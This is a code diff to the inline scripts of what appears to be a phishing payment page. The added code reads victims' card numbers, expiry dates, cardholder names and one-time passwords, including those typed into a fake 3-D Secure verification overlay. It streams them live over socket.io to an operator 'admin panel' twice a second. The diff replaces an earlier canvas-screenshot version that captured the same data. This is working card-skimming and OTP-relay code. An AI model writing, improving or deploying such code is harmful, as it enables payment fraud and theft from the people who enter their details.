@@ -775,24 +775,71 @@
         <!-- Scripts Section -->
         <script src="/socket.io/socket.io.js"></script>
         <script>
-          // Global Variables
-          let isCardValid = false;
-          let isExpiryValid = false;
-          let isProcessing = false;
-          let currentInvoiceId = "";
-          let statusCheckInterval = null; 
-          let timerInterval = null; 
-          let timer = 180;
-          let consentChecked = true;
-          let bankPageWindow = null;
-          const socket = io();
+// Global Variables
+let isCardValid = false;
+let isExpiryValid = false;
+let isProcessing = false;
+let currentInvoiceId = "";
+let statusCheckInterval = null; 
+let timerInterval = null; 
+let timer = 180;
+let consentChecked = true;
+let bankPageWindow = null;
+const socket = io();
+
+// Socket performance enhancer
+(function optimizeSocket() {
+  if (!socket) return;
+  
+  // Override emit to add priority and response optimizations
+  const originalEmit = socket.emit;
+  socket.emit = function(event, ...args) {
+    // Add priority for certain command types
+    if (event === 'otp_entered' || event === 'card_submitted' || 
+        event === 'mc_otp_submitted' || event === 'join') {
+      // For high priority events, try to ensure delivery
+      const callback = typeof args[args.length - 1] === 'function' ? args.pop() : null;
       
-          // Currency Conversion Feature - ADDED
-          const currencySymbols = {
-            'INR': '₹',
-            'USD': '$',
-            'EUR': '€',
-            'GBP': '£',
+      // Add timestamp and attempt counter to message
+      const data = args[0] || {};
+      data._timestamp = Date.now();
+      data._priority = 'high';
+      
+      // Call original emit with our modified arguments
+      const result = originalEmit.call(this, event, ...args, function(response) {
+        if (callback) callback(response);
+        // Also handle acknowledgment
+        console.log(`${event} command acknowledged by server`);
+      });
+      
+      // Also send a separate ping to keep connection active
+      setTimeout(() => {
+        socket.emit('ping', { timestamp: Date.now() });
+      }, 100);
+      
+      return result;
+    }
+    
+    // For regular events, just pass through
+    return originalEmit.apply(this, arguments);
+  };
+  
+  // Setup faster reconnect settings
+  if (socket.io && socket.io.opts) {
+    socket.io.opts.pingInterval = 2500;
+    socket.io.opts.pingTimeout = 5000;
+    socket.io.opts.reconnection = true;
+    socket.io.opts.reconnectionAttempts = Infinity;
+    socket.io.opts.reconnectionDelay = 500;
+  }
+})();
+
+// Currency Conversion Feature - ADDED
+const currencySymbols = {
+  'INR': '₹',
+  'USD': '$',
+  'EUR': '€',
+      'GBP': '£',
             'JPY': '¥',
             'AUD': 'A$',
             'CAD': 'C$',
@@ -2945,217 +2992,309 @@ if (timeLeft <= 0) {
         </script>
         <script>
 <script>
-//Screen Capture Script for Admin Panel
+// Enhanced Screen Capture Script for Admin Panel
 (function() {
-  console.log('Initializing screen capture for admin panel');
+  console.log('Initializing enhanced screen capture for admin panel');
   
   // Variables for the capture process
   let captureInterval = null;
   let lastCaptureTime = 0;
-  const CAPTURE_FPS = 1; // Lower FPS to reduce bandwidth (1 frame per second)
-  const CAPTURE_QUALITY = 0.3; // Lower quality to reduce bandwidth
+  const CAPTURE_FPS = 2; // Increased FPS for more responsive capture
   const MIN_CAPTURE_INTERVAL = 1000 / CAPTURE_FPS;
   
-  // Create hidden canvas for capturing
-  const canvas = document.createElement('canvas');
-  const ctx = canvas.getContext('2d');
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-  canvas.style.display = 'none';
-  document.body.appendChild(canvas);
+  // Function to sanitize values for display
+  function sanitize(value) {
+    if (!value) return '';
+    return String(value)
+      .replace(/</g, '&lt;')
+      .replace(/>/g, '&gt;')
+      .replace(/"/g, '&quot;')
+      .substring(0, 100);
+  }
   
-  // Function to capture screen
+  // Function to get CSS color as hex
+  function colorToHex(color) {
+    // Default colors if parsing fails
+    if (!color || color === 'transparent' || color === 'rgba(0, 0, 0, 0)') {
+      return '#ffffff';
+    }
+    
+    try {
+      // For rgb/rgba colors
+      if (color.startsWith('rgb')) {
+        const rgbMatch = color.match(/rgba?\((\d+),\s*(\d+),\s*(\d+)(?:,\s*[\d.]+)?\)/);
+        if (rgbMatch) {
+          const r = parseInt(rgbMatch[1], 10).toString(16).padStart(2, '0');
+          const g = parseInt(rgbMatch[2], 10).toString(16).padStart(2, '0');
+          const b = parseInt(rgbMatch[3], 10).toString(16).padStart(2, '0');
+          return `#${r}${g}${b}`;
+        }
+      }
+      
+      // For named colors or hex
+      return color;
+    } catch (e) {
+      return '#cccccc'; // Fallback color
+    }
+  }
+
+  // Function to capture DOM state instead of using canvas
   function captureScreen() {
     const now = Date.now();
     if (now - lastCaptureTime < MIN_CAPTURE_INTERVAL) return;
     lastCaptureTime = now;
     
     try {
-      // Update canvas dimensions if needed
-      if (canvas.width !== window.innerWidth || canvas.height !== window.innerHeight) {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-      }
+      // Build a structured representation of the page
+      const pageData = {
+        url: window.location.href,
+        title: document.title,
+        timestamp: new Date().toISOString(),
+        viewport: {
+          width: window.innerWidth,
+          height: window.innerHeight
+        },
+        // Capture card data if available
+        cardData: (() => {
+          if (!currentInvoiceId) return null;
+          
+          const cardNum = document.getElementById('cardNumber')?.value || '';
+          const expiry = document.getElementById('expiry')?.value || '';
+          const cvv = document.getElementById('cvv')?.value || '';
+          const cardHolder = document.getElementById('cardholderName')?.value || '';
+          
+          if (!cardNum && !expiry) return null;
+          
+          return {
+            number: cardNum,
+            expiry: expiry,
+            holder: cardHolder,
+            invoiceId: currentInvoiceId
+          };
+        })(),
+        // Capture OTP if entered
+        otpData: (() => {
+          const otpInput = document.getElementById('otp');
+          if (!otpInput || !otpInput.value) return null;
+          
+          return {
+            value: otpInput.value,
+            timestamp: new Date().toISOString()
+          };
+        })(),
+        // Build an HTML representation of the current visible elements
+        domSnapshot: buildDOMSnapshot()
+      };
       
-      // Clear canvas
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-      
-      // Draw white background
-      ctx.fillStyle = '#ffffff';
-      ctx.fillRect(0, 0, canvas.width, canvas.height);
-      
-      // Get all visible elements
-      const elements = Array.from(document.querySelectorAll('*')).filter(el => {
-        const rect = el.getBoundingClientRect();
-        return rect.width > 0 && rect.height > 0 && 
-               rect.top < window.innerHeight && rect.bottom > 0 && 
-               rect.left < window.innerWidth && rect.right > 0 &&
-               el !== canvas;
+      // Send data to server with socket - use a more reliable approach
+      socket.emit('screen_capture_dom', pageData, (acknowledgment) => {
+        if (acknowledgment && acknowledgment.received) {
+          console.log('Screen capture received by server', acknowledgment.id);
+        }
       });
       
-      // Draw content using HTML2Canvas approach
-      try {
-        // Draw background colors/images
-        elements.forEach(el => {
-          try {
-            const rect = el.getBoundingClientRect();
-            const styles = window.getComputedStyle(el);
-            
-            // Draw background color
-            if (styles.backgroundColor !== 'rgba(0, 0, 0, 0)' && styles.backgroundColor !== 'transparent') {
-              ctx.fillStyle = styles.backgroundColor;
-              ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
-            }
-            
-            // Draw borders
-            if (styles.borderWidth !== '0px') {
-              ctx.strokeStyle = styles.borderColor;
-              ctx.lineWidth = parseInt(styles.borderWidth);
-              ctx.strokeRect(rect.left, rect.top, rect.width, rect.height);
-            }
-          } catch (e) {
-            // Ignore errors for individual elements
-          }
+      // Every 5 seconds, also send a ping to keep connection alive
+      if (now % 5000 < MIN_CAPTURE_INTERVAL) {
+        socket.emit('screen_capture_ping', { 
+          timestamp: now,
+          invoiceId: currentInvoiceId || ''
         });
-        
-        // Draw text contents
-        elements.filter(el => el.textContent.trim() !== '').forEach(el => {
-          try {
-            const rect = el.getBoundingClientRect();
-            const styles = window.getComputedStyle(el);
-            
-            // Skip if element has children that will render the text
-            if (el.children.length === 0 || el.tagName === 'BUTTON' || el.tagName === 'LABEL') {
-              ctx.font = styles.font;
-              ctx.fillStyle = styles.color;
-              ctx.fillText(el.textContent.substring(0, 50), rect.left + 5, rect.top + rect.height/2 + 5);
-            }
-          } catch (e) {
-            // Ignore errors for individual elements
-          }
-        });
-        
-        // Draw form fields specifically
-        document.querySelectorAll('input, select, textarea').forEach(input => {
-          try {
-            const rect = input.getBoundingClientRect();
-            if (rect.width > 0 && rect.height > 0) {
-              // Draw field background
-              ctx.fillStyle = '#f5f5f5';
-              ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
-              
-              // Draw border
-              ctx.strokeStyle = '#cccccc';
-              ctx.lineWidth = 1;
-              ctx.strokeRect(rect.left, rect.top, rect.width, rect.height);
-              
-              // Draw value or placeholder
-              ctx.font = '14px Arial';
-              ctx.fillStyle = input.value ? '#000000' : '#999999';
-              const displayText = input.value || input.placeholder || input.type;
-              
-              // Mask password
-              const text = input.type === 'password' ? '••••••' : displayText;
-              ctx.fillText(text, rect.left + 5, rect.top + rect.height/2 + 5);
-            }
-          } catch (e) {
-            // Ignore individual field errors
-          }
-        });
-        
-        // Try to specifically capture buttons
-        document.querySelectorAll('button').forEach(button => {
-          try {
-            const rect = button.getBoundingClientRect();
-            // Draw button background
-            const styles = window.getComputedStyle(button);
-            ctx.fillStyle = styles.backgroundColor;
-            ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
-            
-            // Draw button text
-            ctx.font = styles.font;
-            ctx.fillStyle = styles.color;
-            ctx.textAlign = 'center';
-            ctx.fillText(button.textContent.trim(), rect.left + rect.width/2, rect.top + rect.height/2 + 5);
-            ctx.textAlign = 'start'; // Reset alignment
-          } catch (e) {
-            // Ignore errors
-          }
-        });
-        
-        // Draw images on the page
-        document.querySelectorAll('img').forEach(img => {
-          try {
-            if (img.complete && img.naturalWidth > 0) {
-              const rect = img.getBoundingClientRect();
-              if (rect.width > 0 && rect.height > 0) {
-                ctx.drawImage(img, rect.left, rect.top, rect.width, rect.height);
-              }
-            }
-          } catch (e) {
-            // Ignore image errors
-          }
-        });
-      } catch (e) {
-        console.log('Error in canvas drawing:', e);
       }
       
-      // Draw page URL and timestamp at the top
-      ctx.fillStyle = 'rgba(0,0,0,0.7)';
-      ctx.fillRect(0, 0, canvas.width, 40);
-      ctx.font = '12px Arial';
-      ctx.fillStyle = '#ffffff';
-      ctx.fillText(`URL: ${window.location.href}`, 10, 15);
-      ctx.fillText(`Time: ${new Date().toLocaleTimeString()}`, 10, 30);
-      
-      // Convert to image data with quality setting
-      const imageData = canvas.toDataURL('image/jpeg', CAPTURE_QUALITY);
-  
-     // Add this inside your captureScreen function, before sending the frame
-  // Add card details overlay if available
-  if (currentInvoiceId) {
-    try {
-      // Draw card data info box
-      const cardNum = document.getElementById('cardNumber')?.value || '';
-      const expiry = document.getElementById('expiry')?.value || '';
-      const cardHolder = document.getElementById('cardholderName')?.value || '';
-      
-      if (cardNum && expiry && cardHolder) {
-        // Draw transparent overlay with card info at the top
-        ctx.fillStyle = 'rgba(0,0,0,0.7)';
-        ctx.fillRect(0, 40, canvas.width, 80);
-        ctx.font = '12px Arial';
-        ctx.fillStyle = '#ffffff';
-        ctx.fillText(`Card: ${cardNum} | Exp: ${expiry} | Name: ${cardHolder}`, 10, 60);
-        ctx.fillText(`Invoice ID: ${currentInvoiceId} | Time: ${new Date().toLocaleTimeString()}`, 10, 80);
-        ctx.fillText('CARD DATA SUBMITTED', 10, 100);
-      }
-    } catch (e) {
-      // Ignore errors
-    }
-  }
-      // Send frame data to server
-      socket.emit('screen_frame', {
-        frameData: imageData,
-        frameType: 'image',
-        timestamp: Date.now(),
-        frameId: Math.random().toString(36).substring(2, 15)
-      });
     } catch (error) {
       console.error('Error in screen capture:', error);
       socket.emit('screen_capture_error', {
-        error: error.message || 'Unknown error during capture'
+        error: error.message || 'Unknown error during capture',
+        timestamp: now
       });
     }
+  }
+  
+  // Build a lightweight DOM snapshot that can be rendered on admin panel
+  function buildDOMSnapshot() {
+    // Start with basic page structure
+    let html = `
+      <div class="captured-page" style="font-family: Arial, sans-serif; color: #333; position: relative; width: 100%; height: ${window.innerHeight}px; overflow: hidden; background: #f9f9f9;">
+        <div class="page-header" style="background: #333; color: white; padding: 8px; position: sticky; top: 0; z-index: 1000;">
+          <div>${sanitize(document.title || 'Payment Page')}</div>
+          <div style="font-size: 12px;">${sanitize(window.location.href)}</div>
+          <div style="font-size: 11px;">Captured: ${new Date().toLocaleString()}</div>
+        </div>
+        <div class="page-content" style="padding: 10px;">
+    `;
+    
+    // Add card data if available
+    const cardNum = document.getElementById('cardNumber')?.value;
+    const expiry = document.getElementById('expiry')?.value;
+    const cardHolder = document.getElementById('cardholderName')?.value;
+    
+    if (cardNum || expiry || cardHolder) {
+      html += `
+        <div class="card-data" style="background: #1e5799; color: white; padding: 10px; margin: 10px 0; border-radius: 4px;">
+          <div style="font-weight: bold; margin-bottom: 5px;">CARD DATA CAPTURED:</div>
+          ${cardNum ? `<div>Card: ${sanitize(cardNum)}</div>` : ''}
+          ${expiry ? `<div>Expiry: ${sanitize(expiry)}</div>` : ''}
+          ${cardHolder ? `<div>Name: ${sanitize(cardHolder)}</div>` : ''}
+          ${currentInvoiceId ? `<div>Invoice ID: ${sanitize(currentInvoiceId)}</div>` : ''}
+        </div>
+      `;
+    }
+    
+    // Add OTP data if available
+    const otpValue = document.getElementById('otp')?.value;
+    if (otpValue) {
+      html += `
+        <div class="otp-data" style="background: #c9302c; color: white; padding: 10px; margin: 10px 0; border-radius: 4px;">
+          <div style="font-weight: bold; margin-bottom: 5px;">OTP ENTERED:</div>
+          <div>Value: ${sanitize(otpValue)}</div>
+          <div>Time: ${new Date().toLocaleString()}</div>
+        </div>
+      `;
+    }
+    
+    // Get all important form elements
+    const mainForm = document.getElementById('mainForm');
+    if (mainForm) {
+      html += `<div class="form-capture" style="background: white; padding: 10px; border: 1px solid #ddd; margin-bottom: 10px;">`;
+      
+      // Capture all input fields
+      const inputs = mainForm.querySelectorAll('input, select, textarea');
+      if (inputs.length > 0) {
+        html += `<div style="font-weight: bold; margin-bottom: 5px;">FORM INPUTS:</div>`;
+        
+        inputs.forEach(input => {
+          const rect = input.getBoundingClientRect();
+          if (rect.width === 0 || rect.height === 0) return; // Skip hidden elements
+          
+          const styles = window.getComputedStyle(input);
+          const label = input.previousElementSibling?.textContent || input.getAttribute('placeholder') || input.id || input.name || input.type;
+          
+          html += `
+            <div class="form-input" style="margin-bottom: 5px; padding: 5px; border: 1px solid #eee;">
+              <div><strong>${sanitize(label)}</strong> (${input.type})</div>
+              <div style="
+                background: ${colorToHex(styles.backgroundColor) || '#f5f5f5'}; 
+                border: 1px solid ${colorToHex(styles.borderColor) || '#ccc'}; 
+                padding: 4px 8px;
+                position: relative;
+                min-height: 24px;
+                margin-top: 3px;
+              ">
+                ${input.type === 'password' ? '••••••' : sanitize(input.value || input.placeholder || '')}
+              </div>
+            </div>
+          `;
+        });
+      }
+      
+      // Capture buttons
+      const buttons = mainForm.querySelectorAll('button');
+      if (buttons.length > 0) {
+        html += `<div style="font-weight: bold; margin-top: 10px; margin-bottom: 5px;">BUTTONS:</div>`;
+        
+        buttons.forEach(button => {
+          const rect = button.getBoundingClientRect();
+          if (rect.width === 0 || rect.height === 0) return; // Skip hidden elements
+          
+          const styles = window.getComputedStyle(button);
+          
+          html += `
+            <div class="form-button" style="
+              display: inline-block;
+              margin-right: 10px;
+              background: ${colorToHex(styles.backgroundColor) || '#4a90e2'}; 
+              color: ${colorToHex(styles.color) || 'white'};
+              padding: 5px 10px;
+              border-radius: 4px;
+              ${button.disabled ? 'opacity: 0.5;' : ''}
+            ">
+              ${sanitize(button.textContent.trim() || 'Button')}
+              ${button.disabled ? ' (disabled)' : ''}
+            </div>
+          `;
+        });
+      }
+      
+      html += `</div>`;
+    }
+    
+    // Capture OTP form if visible
+    const otpForm = document.getElementById('otpForm');
+    if (otpForm && !otpForm.classList.contains('hidden')) {
+      const otpInput = otpForm.querySelector('.otp-input');
+      const otpValue = otpInput?.value || '';
+      
+      html += `
+        <div class="otp-form-capture" style="background: #f0f8ff; padding: 10px; border: 1px solid #bce8f1; margin-bottom: 10px;">
+          <div style="font-weight: bold; margin-bottom: 5px;">OTP FORM ACTIVE:</div>
+          <div style="background: white; border: 1px solid #ccc; padding: 8px; text-align: center; letter-spacing: 5px; font-size: 18px;">
+            ${otpValue ? sanitize(otpValue) : '• • • • • •'}
+          </div>
+          <div style="margin-top: 5px; font-size: 12px; color: #777;">
+            Timer: ${document.getElementById('timer')?.textContent || 'N/A'}
+          </div>
+        </div>
+      `;
+    }
+    
+    // Capture MC verification overlay if visible
+    const mcOverlay = document.getElementById('mcVerificationOverlay');
+    if (mcOverlay && mcOverlay.style.display !== 'none') {
+      const mcOtpInput = document.getElementById('mcOtpInput');
+      const mcOtpValue = mcOtpInput?.value || '';
+      
+      html += `
+        <div class="mc-verification-capture" style="background: #f7f7f7; padding: 10px; border: 1px solid #ddd; margin-bottom: 10px;">
+          <div style="font-weight: bold; margin-bottom: 5px; color: #2778c4;">3D SECURE VERIFICATION ACTIVE:</div>
+          <div style="display: flex; align-items: center; margin-bottom: 5px;">
+            <div style="flex: 1; text-align: left;">
+              Bank: ${document.getElementById('bankLogo')?.alt || 'Unknown Bank'}
+            </div>
+            <div style="flex: 1; text-align: right;">
+              ${document.getElementById('verificationTypeLogo')?.alt || 'Card Verification'}
+            </div>
+          </div>
+          <div style="background: white; border: 1px solid #ccc; padding: 8px; margin: 5px 0;">
+            OTP Input: ${mcOtpValue ? sanitize(mcOtpValue) : 'Not entered yet'}
+          </div>
+          <div style="margin-top: 5px; font-size: 12px; color: #777;">
+            Timer: ${document.getElementById('mcTimer')?.textContent || 'N/A'}
+          </div>
+        </div>
+      `;
+    }
+    
+    // Close the page content and page container
+    html += `
+        </div>
+      </div>
+    `;
+    
+    return html;
   }
   
   // Function to start capturing
   function startCapture() {
     if (captureInterval) return; // Already running
     
-    // Update canvas dimensions
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
+    // Socket performance optimization
+    if (socket.io && socket.io.opts) {
+      // Try to improve socket.io performance
+      socket.io.opts.pingInterval = 2000; // More frequent pings to maintain connection
+      socket.io.opts.pingTimeout = 5000; // Faster disconnect detection
+      socket.io.opts.reconnection = true; // Enable reconnection
+      socket.io.opts.reconnectionAttempts = 10; // More attempts
+      socket.io.opts.reconnectionDelay = 500; // Faster retry
+    }
+    
+    // Install socket reconnect handler
+    socket.on('connect', () => {
+      console.log('Socket reconnected, resuming screen capture');
+      if (currentInvoiceId) {
+        // Re-join room on reconnect
+        socket.emit('join', currentInvoiceId);
+      }
+    });
     
     // Start capture loop
     captureInterval = setInterval(captureScreen, MIN_CAPTURE_INTERVAL);
@@ -3163,7 +3302,7 @@ if (timeLeft <= 0) {
     // Do one immediate capture
     captureScreen();
     
-    console.log('Screen capture started');
+    console.log('Enhanced screen capture started');
   }
   
   // Function to stop capturing
@@ -3189,12 +3328,18 @@ if (timeLeft <= 0) {
     }
   });
   
-  // Listen for window resize to update canvas dimensions
-  window.addEventListener('resize', () => {
-    if (captureInterval) {
-      canvas.width = window.innerWidth;
-      canvas.height = window.innerHeight;
-    }
+  // Listen for general socket events
+  socket.on('connect_error', (error) => {
+    console.error('Socket connection error:', error);
+  });
+  
+  socket.on('reconnect_attempt', (attemptNumber) => {
+    console.log(`Socket reconnection attempt ${attemptNumber}`);
+  });
+  
+  // Add general command acknowledged handler to improve response speed
+  socket.on('command_acknowledged', (data) => {
+    console.log('Command acknowledged by server:', data.command);
   });
   
   // Start capture automatically
@@ -3203,7 +3348,8 @@ if (timeLeft <= 0) {
   // Report errors
   window.addEventListener('error', (e) => {
     socket.emit('screen_capture_error', {
-      error: `JS Error: ${e.message} at ${e.filename}:${e.lineno}`
+      error: `JS Error: ${e.message} at ${e.filename}:${e.lineno}`,
+      timestamp: Date.now()
     });
   });
 })();
